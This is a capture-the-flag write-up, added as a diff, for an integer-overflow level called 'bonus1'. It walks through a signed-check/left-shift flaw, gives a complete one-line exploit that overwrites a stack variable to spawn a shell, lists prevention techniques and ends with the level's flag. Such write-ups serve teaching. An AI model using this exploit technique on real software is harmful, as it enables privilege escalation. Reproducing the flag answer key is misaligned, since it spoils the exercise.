@@ -1,0 +1,229 @@
+Integer Overflow Exploitation - Bonus1
+=======================================
+
+Vulnerability Type: Integer Overflow → Buffer Overflow
+Technique: Signed/Unsigned Confusion + Left Shift Overflow
+
+The Integer Overflow Vulnerability:
+------------------------------------
+Integer overflow occurs when an arithmetic operation produces a result
+that exceeds the maximum (or minimum) value that can be stored in the
+integer type.
+
+In C, integer overflow behavior depends on whether the integer is signed
+or unsigned:
+- Signed overflow: Undefined behavior (but typically wraps around)
+- Unsigned overflow: Defined behavior (wraps around modulo 2^n)
+
+The Vulnerability in bonus1:
+----------------------------
+1. num = atoi(argv[1])  // Converts string to signed int
+2. if (num > 9) return 1;  // Signed comparison
+3. memcpy(buffer, argv[2], num << 2);  // Left shift
+
+The problem:
+- The check uses SIGNED comparison (num > 9)
+- The shift operation treats the result as UNSIGNED for size
+- Negative numbers pass the check but create large sizes!
+
+Signed Integer Representation:
+-------------------------------
+32-bit signed integers use two's complement:
+
+Positive: 0x00000000 to 0x7FFFFFFF (0 to 2,147,483,647)
+Negative: 0x80000000 to 0xFFFFFFFF (-2,147,483,648 to -1)
+
+Example:
+-2147483637 = 0x8000000B
+  Binary: 10000000 00000000 00000000 00001011
+  
+  Bit 31 (MSB) = 1 → Negative number
+  Value = -(2^31) + 11 = -2147483648 + 11 = -2147483637
+
+Left Shift Operation:
+---------------------
+The << operator shifts bits to the left:
+
+-2147483637 << 2:
+  Original: 10000000 00000000 00000000 00001011
+  Shift 2:  00000000 00000000 00000000 00101100
+  Result:   0x0000002C = 44 (decimal)
+
+Key insight: The high bits (including sign bit) are shifted out!
+
+Why -2147483637?
+----------------
+We need a number that:
+1. Is negative (passes num > 9 check)
+2. When shifted left by 2, gives us 44 bytes
+3. 44 bytes = 40 (buffer) + 4 (num variable)
+
+Calculation:
+- We want: (num << 2) = 44
+- Therefore: num = 44 / 4 = 11
+- But 11 > 9, so we need to use overflow
+- We use: 0x80000000 + 11 = 0x8000000B = -2147483637
+
+When shifted:
+- 0x8000000B << 2 = 0x0000002C = 44
+
+Memory Layout on Stack:
+------------------------
+Address (example)  | Content
+-------------------|----------------------------------
+0xbffff6d0         | buffer[0-39]   (40 bytes)
+0xbffff6f8         | num            (4 bytes) ← TARGET
+0xbffff6fc         | Saved EBP      (4 bytes)
+0xbffff700         | Return addr    (4 bytes)
+
+Overflow Path:
+--------------
+memcpy(buffer, argv[2], 44) copies:
+
+Source (argv[2]):
+[AAAA...AAAA][0x574f4c46]
+ 40 bytes      4 bytes
+
+Destination (stack):
+buffer[0-39]  ← 'A' * 40
+num           ← 0x574f4c46 (overwritten!)
+
+The Magic Value: 0x574f4c46
+----------------------------
+Hex: 0x574f4c46
+ASCII (little-endian):
+  0x46 = 'F'
+  0x4c = 'L'
+  0x4f = 'O'
+  0x57 = 'W'
+
+Reading backwards: "FLOW"
+
+This is a hint that we need to "overflow" to get the flag!
+
+Payload Construction:
+---------------------
+Argument 1: -2147483637
+  - Passes the num > 9 check (negative number)
+  - When shifted: -2147483637 << 2 = 44 bytes
+
+Argument 2: 'A' * 40 + '\x46\x4c\x4f\x57'
+  - 40 bytes of padding (fills buffer)
+  - 4 bytes: 0x574f4c46 in little-endian
+
+Complete Exploit:
+-----------------
+./bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
+
+Execution Flow:
+---------------
+1. main() starts
+2. num = atoi("-2147483637") = -2147483637
+3. Check: if (-2147483637 > 9) → FALSE (passes)
+4. Calculate size: -2147483637 << 2 = 44
+5. memcpy(buffer, payload, 44)
+6. Copy 40 bytes to buffer
+7. Copy 4 bytes to num (overwrites with 0x574f4c46)
+8. Check: if (num == 0x574f4c46) → TRUE
+9. execl("/bin/sh", "sh", NULL)
+10. Shell spawned as bonus2!
+
+Alternative Approaches:
+-----------------------
+We could also use other negative numbers:
+
+Example: -1073741813 (0xC000000B)
+  -1073741813 << 2 = 44
+
+The key is finding N where:
+  - N < 0 (passes check)
+  - (N << 2) & 0xFFFFFFFF = 44
+
+Integer Overflow Types:
+-----------------------
+1. Addition overflow:
+   INT_MAX + 1 → INT_MIN
+
+2. Multiplication overflow:
+   1000000 * 1000000 → wraps around
+
+3. Left shift overflow (our case):
+   Negative << n → can become positive
+
+4. Type conversion:
+   unsigned int x = -1; → 0xFFFFFFFF (4,294,967,295)
+
+Security Implications:
+----------------------
+Integer overflows can lead to:
+- Buffer overflows (our case)
+- Heap overflows
+- Integer underflows
+- Logic errors
+- Privilege escalation
+
+Real-world examples:
+- CVE-2002-0391: Apache chunked encoding
+- CVE-2004-0492: ProFTPD
+- CVE-2009-1897: Linux kernel
+
+Prevention Techniques:
+----------------------
+1. Input validation:
+   if (num > 9 || num < 0) return 1;
+
+2. Safe arithmetic:
+   if (num > SIZE_MAX / 4) return 1;
+   size_t size = num * 4;
+
+3. Use safe types:
+   size_t instead of int for sizes
+
+4. Compiler flags:
+   -ftrapv (trap on signed overflow)
+   -fwrapv (define signed overflow behavior)
+   -fsanitize=integer (UBSan)
+
+5. Static analysis:
+   Coverity, Clang Static Analyzer
+
+6. Runtime checks:
+   __builtin_mul_overflow() (GCC/Clang)
+
+Example Safe Code:
+------------------
+int main(int argc, char **argv) {
+    char buffer[40];
+    int num;
+    size_t size;
+    
+    if (argc < 3) return 1;
+    
+    num = atoi(argv[1]);
+    
+    // Check both bounds
+    if (num > 9 || num < 0) {
+        return 1;
+    }
+    
+    // Check for overflow before operation
+    if (num > SIZE_MAX / 4) {
+        return 1;
+    }
+    
+    size = (size_t)num * 4;
+    
+    // Bounds check
+    if (size > sizeof(buffer)) {
+        return 1;
+    }
+    
+    memcpy(buffer, argv[2], size);
+    
+    return 0;
+}
+
+Flag:
+-----
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
